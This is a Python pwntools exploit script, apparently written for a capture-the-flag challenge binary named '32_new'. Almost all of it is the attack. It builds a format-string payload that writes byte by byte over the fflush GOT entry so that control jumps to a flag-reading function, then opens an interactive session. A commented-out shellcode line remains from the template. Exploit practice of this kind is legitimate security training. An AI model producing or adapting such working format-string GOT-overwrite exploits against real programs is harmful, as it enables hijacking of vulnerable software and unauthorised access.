#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template 32_new
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '32_new')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()
io.recvline()
fflushAdr = 0x080485c0
fflush_adr0 = p32(0x804a028)
fflush_adr1 = p32(0x804a029)
fflush_adr2 = p32(0x804a02b)
addr1 = b"%10$x"
addr2 = b"%11$x"
addr3 = b"%12$x"
flagAddr = 0x0804870b
val1 = b"%185x"
val2 = b"%892x"
val3 = b"%129x"
payload = fflush_adr0 + fflush_adr1 + fflush_adr2 + val1 + addr1+ val2 +addr2+ val3 +addr3
# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
io.sendline(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

